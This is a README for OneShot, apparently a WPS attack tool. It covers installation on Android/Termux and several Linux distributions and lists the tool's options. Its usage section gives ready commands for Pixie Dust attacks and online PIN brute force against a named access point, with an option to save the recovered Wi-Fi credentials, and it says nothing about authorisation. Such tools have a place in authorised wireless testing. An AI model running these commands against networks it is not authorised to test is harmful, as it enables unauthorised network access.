## [Termux](https://termux.com/)
Please note that root access is required.  

## Installation Steps

**Requirements**
 ```
 pkg install -y root-repo
 ```
 ```
 pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
 ```
**Download DoubleShot**
 ```
 git clone --depth 1 https://github.com/tanvir-projects-archive/OneShot OneShot
 ```
#### Running Command
 ```
 sudo python OneShot/oneshot.py -i wlan0 --iface-down -K
 ```


## For Linux Distribution 🐧

## Debian/Ubuntu
 ```
 sudo apt install -y python3 wpasupplicant iw wget
 ```
**Installing Pixiewps**

***Ubuntu 18.04 and above or Debian 10 and above***
 ```
 sudo apt install -y pixiewps
 ```
 
***Other versions***
 ```
 sudo apt install -y build-essential unzip
 wget https://github.com/wiire-a/pixiewps/archive/master.zip && unzip master.zip
 cd pixiewps*/
 make
 sudo make install
 ```
**Getting OneShot**
 ```
 cd ~
 wget https://raw.githubusercontent.com/tanvir-projects-archive/OneShot/master/oneshot.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 wget https://raw.githubusercontent.com/tanvir-projects-archive/OneShot/master/vulnwsc.txt
 ```
 

## Arch Linux
 ```
 sudo pacman -S wpa_supplicant pixiewps wget python
 ```
**Getting OneShot**
 ```
 wget https://raw.githubusercontent.com/tanvir-projects-archive/OneShot/master/oneshot.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 wget https://raw.githubusercontent.com/tanvir-projects-archive/OneShot/master/vulnwsc.txt
 ```

 
## Alpine Linux
It can also be used to run on Android devices using: [Linux Deploy](https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy)

**Installing requirements**
Adding the testing repository:
 ```
 sudo sh -c 'echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing/" >> /etc/apk/repositories'
 ```
 ```
 sudo apk add python3 wpa_supplicant pixiewps iw
 ```
 **Getting OneShot**
 ```
 sudo wget https://raw.githubusercontent.com/tanvir-projects-archive/OneShot/master/oneshot.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 sudo wget https://raw.githubusercontent.com/tanvir-projects-archive/OneShot/master/vulnwsc.txt
 ```


# Usage
```
 oneshot.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 oneshot.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 oneshot.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running OneShot with the `--mtk-wifi` flag to initialize Wi-Fi device driver.

# Credits 
* `rofl0r` for initial implementation;
* `Monohrom` for testing, help in catching bugs, some ideas;
* `Wiire` for developing Pixiewps.
